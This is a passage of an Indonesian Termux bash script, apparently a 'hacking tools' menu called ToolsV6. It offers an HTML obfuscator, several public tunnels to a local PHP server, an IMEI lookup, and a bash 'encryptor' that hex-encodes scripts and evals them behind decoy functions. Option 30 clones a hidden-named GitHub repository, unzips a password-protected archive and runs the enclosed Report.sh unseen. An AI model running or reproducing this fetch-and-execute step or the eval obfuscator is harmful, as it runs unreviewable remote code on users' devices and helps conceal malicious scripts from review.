⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀
⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢰⣿⠀
⣿⠀⠀⠀⠀⠀⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇⠀⠀⠀⠀⢸⣿⠀
⣿⡆⠀⠀⠀⠀⢻⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀
⣿⡇⠀⠀⠀⠀⢸⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⣾⣿⠀
⣿⡇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⠀
⣿⣧⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢻⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⠀
⣿⣿⠀⠀⠀⠀⠀⣤⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⢰⣿⣿⠀
⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⢸⣿⣿⠀
⣿⣿⡆⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⣶⣤⣴⣶⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⢸⣿⣿⠀
⣿⣿⡇⠀⠀⠀⠀⠈⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠋⠀⠀⠀⠀⠀⣿⣿⣿⠀
⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀
⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠀
⣿⣿⣿⣿⣷⣶⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ " | lolcat 
    echo ""
    echo -e "${p}   Development ${g}: ${c}Thxyzz404"
    echo ""
    echo -e "${g}Contoh input pengguna : /sdcard/Folder/File_Tujuan.py "
    echo ""
    echo -e "${y}"
    read -p "Masukkan file path HTML : " anomali
    echo ""    
    if [ ! -f "$anomali" ]; then
        clear 
        echo ""
        echo -e "${r} File html tidak di temukan bg."
        echo ""
        return
    fi   
    mek="${anomali##*.}"
    if [[ "$mek" != "html" && "$mek" != "htm" ]]; then
        clear 
        echo ""
        echo -e "${y} File berformat harus html bg."
        echo ""
        return
    fi    
    file_bsr=$(stat -f%z "$anomali" 2>/dev/null || stat -c%s "$anomali" 2>/dev/null)
    if [ "$file_bsr" -gt 1000000 ]; then
        echo ""
        echo -e "${c} File ini besar memproses : [ $((file_bsr/1024)) KB ] "
        echo ""
    fi   
    echo -e "${r}[ ${g}✓ ${r}]${y} File terbaca : $(basename "$anomali")"
    mkdir -p "$SAVE_DIR"    
    output_file="$SAVE_DIR/obf_$(basename "$anomali")"   
    (
        content=$(cat "$anomali")
        final=$(echo "$content" | thxyzz404)
        echo "$final" > "$output_file"
    ) &
    show_loading $!
    wait $!    
    if [ -f "$output_file" ]; then
        out_size=$(stat -f%z "$output_file" 2>/dev/null || stat -c%s "$output_file" 2>/dev/null)
        echo ""
        echo -e "${c}=================================="
        echo ""
        echo -e "${g} • Ukuran asli : $file_bsr bytes"
        echo -e " • Ukuran hasil : $out_size bytes"
        if [ "$file_bsr" -gt 0 ]; then
            rasio=$(( (out_size * 100) / file_bsr ))
            echo -e " • Rasio : ${rasio}% "
        else
            echo -e " • Rasio : Tidak dapat dihitung (file kosong)"
        fi     
        echo ""
        echo -e "${c}=================================="
        echo ""
        echo -e "${g} • Lokasi penyimpanan : $output_file"
        echo ""
    else
        echo ""
        clear
        echo -e "${r} Terjadi kesalahan membuat file output."
        echo ""
    fi
}
thyzz404
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "29" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
b='\033[34;1m'
y='\033[33;1m'
n='\033[0m'
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
██╗   ██╗██████╗ ██╗     
██║   ██║██╔══██╗██║     
██║   ██║██████╔╝██║     
██║   ██║██╔══██╗██║     
╚██████╔╝██║  ██║███████╗
 ╚═════╝ ╚═╝  ╚═╝╚══════╝" | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Serveonet "
echo -e "${r}[${y} 02 ${r}] ${g}Ihr-life "
echo -e "${r}[${y} 03 ${r}] ${g}Ngrok "
echo -e "${r}[${y} 04 ${r}] ${g}Claudflare "
echo -e "${r}[${y} 05 ${r}] ${c}Keluar "
}
url_1() {
clear
cd $HOME
echo "
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo -e "${g}  Development ${r}: ${c}Thxyzz404"
echo -e "${y}"
read -p "  Masukkan Port ===> : " isi
clear
neofetch --ascii_distro kali
echo ""
echo -e "${c}Port Yang Anda Masukkan :${n} $isi"
echo ""
echo -e "${r}Link di bawah silakan copy dan gunakan : "
echo -e "${n}"
ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:$isi serveo.net 2>/dev/null
}
url_2() {
clear 
cd $HOME
echo "
░█▀▀░█▀▀░▀█▀░█▄█░░░░░█▀█░█▀▄░█▀█░▀█▀
░█░░░▀▀█░░█░░█░█░▄▄▄░█▀▀░█▀▄░█░█░░█░
░▀▀▀░▀▀▀░░▀░░▀░▀░░░░░▀░░░▀░▀░▀▀▀░░▀░ " | lolcat
echo ""
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" p
echo ""
p=${p:-8080}
php -S 127.0.0.1:$p >/dev/null 2>&1 &
php_pid=$!
cleanup() {
    clear 
    echo ""
    echo -e "${r}Program dihentikan. Menutup server..!!"
    echo ""
    kill $php_pid 2>/dev/null
    sleep 2 
    pkill -9 -f com.termux
}
trap cleanup SIGINT SIGTERM
echo -e "${r}[ ${g}✓ ${r}]${c} Menunggu link..!!"
ssh -o StrictHostKeyChecking=no -R 80:localhost:$p nokey@localhost.run 2>/dev/null | while IFS= read -r line; do
    if [[ $line =~ tunneled\ with\ tls\ termination,\ (https://)?([^ ]*) ]]; then
        hostname="${BASH_REMATCH[2]}"
        echo ""
        echo -e "${g}Link anda : ${c}$hostname"
        echo ""
        echo -e "${r}Tekan CTRL+Z untuk menghentikan."
    fi
done
}
url_3() {
clear 
cd $HOME
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
n='\033[0m'
cok="ansi-rounded"
ngrok="$HOME/ngrok"
install_ngrok() {
    echo ""
    echo -e "${r}[ ${g}++ ${r}]${c} MENGINSTAL NGROK VERSI TERBARU..!!"
    sleep 2
    cd $HOME
    rm -rf ngrok
    mkdir -p ngrok
    cd ngrok
    curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
    tar -xzf ngrok-v3-stable-linux-arm64.tgz
    rm ngrok-v3-stable-linux-arm64.tgz
    chmod +x ngrok
    clear
    cowsay -f eyes "By.Thxyzz404" | boxes -d "$cok" | lolcat
    echo -e "${y}"
    read -p "Masukkan AuthToken Ngrok Anda : " tokenlu
    ./ngrok config add-authtoken $tokenlu
    clear
    echo -e "${bold_bg}${bold_gren} NGROK SUDAH TERINSTAL DENGAN VERSI TERBARU ${n}"
    sleep 2
}
if [ -d "$ngrok" ] && [ -f "$ngrok/ngrok" ]; then
    cd $ngrok
    versi_ngrok=$(./ngrok version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    if [ -z "$versi_ngrok" ] || [ "$(printf '%s\n' "3.20.0" "$versi_ngrok" | sort -V | head -n1)" != "3.20.0" ]; then
        echo -e "${r}[ ! ] Versi ngrok terlalu lama atau error. Mengupdate.${n}"
        install_ngrok
        cd $ngrok
    fi
    clear
    cowsay -f eyes "By.Thxyzz404" | boxes -d "$cok" | lolcat
    echo ""
    echo -e "${r}[ ${g}?? ${r}]${y} Pilih mthode ${r}[ ${g}http ${r}]"
    echo -e "${g}"
    read -p "localhost input mthode [ http ] : " manakocak
    clear
    cowsay -f eyes "By.Thxyzz404" | boxes -d "$cok" | lolcat
    echo ""
    echo -e "${r}[ ${g}?? ${r}]${c} Masukkan prot anda bebas ${r}[ ${g}contoh : 8080 ${r}]"
    echo -e "${c}"
    read -p "localhost input mthode : " port
    clear
    echo "
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | boxes -d "$cok" | lolcat
    echo ""
    echo -e "${bold_bg}${bold_gren} NYALAKAN DULU HOTSPOT ANDA ${n}"
    echo -e "${g}"
    read -p "TEKAN ENTER UNTUK MEMULAI"
    ./ngrok $manakocak $port
else
    install_ngrok
    exec "$0"
fi
}
url_4() {
clear 
cd $HOME
echo ""
echo -e "${g} Sedang Menginstall Package..!!"
sleep 2
echo -e "${c}"
pkg update && pkg install cloudflared
clear
echo ""
echo -e "${r} Package Telah Di Install Menjalankan Program..!!"
sleep 3
clear
cd $HOME
echo "
 ▗▄▄▖▗▖    ▗▄▖ ▗▖ ▗▖▗▄▄▄ ▗▄▄▖ ▗▄▄▄▖▗▄▄▄ 
▐▌   ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌  █▐▌ ▐▌▐▌   ▐▌  █
▐▌   ▐▌   ▐▛▀▜▌▐▌ ▐▌▐▌  █▐▛▀▚▖▐▛▀▀▘▐▌  █
▝▚▄▄▖▐▙▄▄▖▐▌ ▐▌▝▚▄▞▘▐▙▄▄▀▐▌ ▐▌▐▌   ▐▙▄▄▀
        Developer : Thxyzz404
 " | lolcat 
clauderfred_thxyzz404() {
  echo ""
  read -p "$(echo -e "${y}Masukkan Port Yang Ingin Anda Gunakan ${r}[ ${g}Misall 8080 ${r}]${c} : ")" port
  echo ""
  echo -e "${r}[ ${g}• ${r}]${c} Menjalankan Server PHP Lokal Di Port $port..!!"
  echo ""
  php -S localhost:$port > /dev/null 2>&1 &
  sleep 3
  echo -e "${r}[ ${g}• ${r}]${c} Membuat Link Publik Dari Cloudflared..!!"
  echo ""
  cloudflared tunnel --url http://localhost:$port --protocol http2 > sendlink 2>&1 &
  sleep 8
  link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
  if [ -n "$link" ]; then
    echo -e "${r}[ ${g}✓ ${r}]${c} Link Clauderfred Anda ${g}: ${y}$link"
    echo ""
  else
    echo ""
    echo -e "${g}[ ${r}X ${g}]${y} Gagall Membuat Link. Pastikan Cloudflared Terinstal Dengan Benar..!!"
    echo ""
  fi
}
clauderfred_thxyzz404
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) url_1 ;;
        2|02) url_2 ;;
        3|03) url_3 ;;
        4|04) url_4 ;;
        5|05) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "30" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.ban_temp"
PEJU="Report.sh"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        chmod +x Report.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth 32 https://github.com/Wewokdetoknotoline/.mmkmeratusueidukdukfromkeyloardancokkuiasu "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "DEC_888_ASU_999_TAI" BAN.sh >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Report.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth 32 https://github.com/Wewokdetoknotoline/.mmkmeratusueidukdukfromkeyloardancokkuiasu "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    unzip -o -P "DEC_888_ASU_999_TAI" BAN.sh >/dev/null 2>&1 || kontol "Ada Maslah."
    chmod +x Report.sh
    bash "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "31" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
echo "
██╗███╗   ███╗███████╗██╗
██║████╗ ████║██╔════╝██║
██║██╔████╔██║█████╗  ██║
██║██║╚██╔╝██║██╔══╝  ██║
██║██║ ╚═╝ ██║███████╗██║
╚═╝╚═╝     ╚═╝╚══════╝╚═╝" | lolcat
echo ""
echo -e "${p} Developer ${r}: ${c}Thxyzz404 "
echo ""
echo -e "${g}"
read -p "Masukkan IMEI (14-17 digit) : " imei
echo ""
if [[ $imei =~ ^[0-9]+$ ]] && [[ ${#imei} -ge 14 ]] && [[ ${#imei} -le 17 ]]; then
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Mengecek IMEI "
sleep 1
pantau_aktivitas
url="https://www.officialsimunlock.com/Home/GetIMEI"
data="imei=$imei"
res=$(curl -s -X POST "$url" \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "User-Agent: Mozilla/5.0 (compatible; Python IMEI Checker)" \
-d "$data" \
--max-time 20 2>/dev/null)
if [ -z "$res" ]; then
echo ""
echo -e "${r} Terjadi kesalahan."
return 1
fi
echo ""
echo -e "${r}===========${y}[ ${g}HASIL CEK IMEI ${y}]${r}==========="
echo ""
echo -e "${c}IMEI target ${r}: ${g}$imei"
if echo "$res" | jq . >/dev/null 2>&1; then
success=$(echo "$res" | jq -r '.Success // "null"')
message=$(echo "$res" | jq -r '.Message // "null"')
if [ "$success" != "null" ]; then
echo -e "${g}Success : $success"
fi
if [ "$message" != "null" ]; then
echo -e "${c}Message : $message"
fi
model=$(echo "$res" | jq -r '.Model // empty')
if [ -n "$model" ] && [ "$model" != "null" ]; then
echo ""
echo -e "${y}--- DETAIL DEVICE ---"
echo "$model" | jq -r 'to_entries[] | .key + " : " + .value'
fi
echo ""
echo -e "${r}--- DATA TAMBAHAN ---"
echo -e "${c}"
echo "$res" | jq -r 'to_entries[] | select(.key | IN("Success", "Message", "Model") | not) | .key + " : " + (.value | tostring)'
else
echo "$res"
fi
else
echo ""
echo -e "${r} IMEI ini tidak valid."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "32" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
SAVE_DIR="/sdcard/ENCRIPSI_BASH"
n='\033[0m'  
g='\033[1;32m'  
c='\033[1;36m'  
r='\033[1;31m'  
y='\033[1;33m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠚⠉⠉⠓⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣠⠴⠋⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⡤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⡀⠀⠀⠀
⢠⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡄⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣷⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠋⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠃⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣀⠈⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠘⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠟⠋⣰⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠈⠓⠦⣄⠀⠀⠀⠀⠀⠀⢸⣿⣿⣶⣤⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠲⣤⡀⠀⠀⢸⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⢤⣈⣿⡿⠟⠋⠀
" | lolcat
echo -e "${r} Development ${n}: ${y}Thxyzz404"
echo ""
echo -e "${c}Contoh input pengguna : /sdcard/Folder/File_Tujuan.py "
echo -e "${g}"
read -p "Masukkan path file : " file
echo -e "${y}"
read -p "Masukkan output file : " ou
mkdir -p "$SAVE_DIR"
ou="$SAVE_DIR/$ou"
if [ ! -f "$file" ]; then
    clear 
    echo ""
    echo -e "${r}Error : File '$file' tidak ditemukan!"
    echo ""
fi
dasar_banci=$(xxd -p "$file" | tr -d '\n')
cat > "$ou" << 'EOF'
set +H
_ank_ajg(){
  local x=$((RANDOM%9999))
  [ $x -eq 1337 ] && echo "Decoder_Goblok"
}
_ank_babi(){
  for i in {1..3}; do :; done
}
_ank_monyet(){
  false && exit 0
}
_ank_haram(){
  echo "Decoder_Goblok" > /dev/null
}
_ank_bego(){
  local y=$((RANDOM%100))
  [ $y -eq 50 ] && echo "Decoder_Goblok"
}
EOF
echo "__P__=\"$dasar_banci\"" >> "$ou"
cat >> "$ou" << 'EOF'
__run__(){
  eval "$(echo $__P__ | xxd -r -p)"
}
if [ "$RANDOM" -gt 99999 ]; then
  _ank_ajg
  _ank_haram
  _ank_bego
else
  _ank_monyet
  _ank_babi
fi
__run__
EOF
chmod +x "$ou"
echo ""
echo -e "${n}=========================================="
echo -e "${g}     Source berhasil di encripsi!"
echo -e "${c}     File terenkripsi ${y}: $ou"
echo -e "${n}=========================================="
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "33" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
install_package() {
local pkg="$1"
if command -v "$pkg" >/dev/null 2>&1; then
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} $pkg sudah terinstall."
    sleep 2
    echo ""
else
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} $pkg sedang menginstall."
    sleep 2
    echo -e "${n}"
    apt-get install -y "$pkg"
fi
}
install_package "libspeedtest"
hide_cursor() {
tput civis
}
show_cursor() {
tput cnorm
}
cleanup() {
echo ""
echo -e "\033[31;1m Kluar dari Network."
echo ""
sleep 4
pkill -9 -f com.termux
show_cursor
tput sgr0
}
trap cleanup SIGINT SIGTERM
hide_cursor
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣶⣿⣿⠿⠛⠉⠉⠉⠀⠀⠉⠉⠉⠛⠿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⠟⠉⠀⠀⠀⠀⢀⣤⣤⣤⣀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣄⠀⠀⠀
⠀⠀⣼⣿⡟⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣯⣢⡀⠀⠀⠀⠈⢻⣿⣧⠀⠀
⠀⣼⣿⡟⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣧⠀
⢸⣿⡟⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇
⣾⣿⡇⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷
⣿⣿⡁⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿
⢿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢸⣿⡿
⢸⣿⣧⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⣼⣿⡇
⠀⢻⣿⣧⠀⠀⠀⠀⠈⠋⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⣿⡟⠀
⠀⠀⢻⣿⣧⡀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢀⣼⣿⡟⠀⠀
⠀⠀⠀⠙⢿⣿⣦⣀⠀⠀⢀⣼⠟⠙⠘⣿⣿⣿⣿⣿⣿⣿⠀⣴⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣦⣀⣀⣾⣁⡈⠛⢿⣿⣿⣿⡆⠹⠋⠀⠀⠀⠀⠀
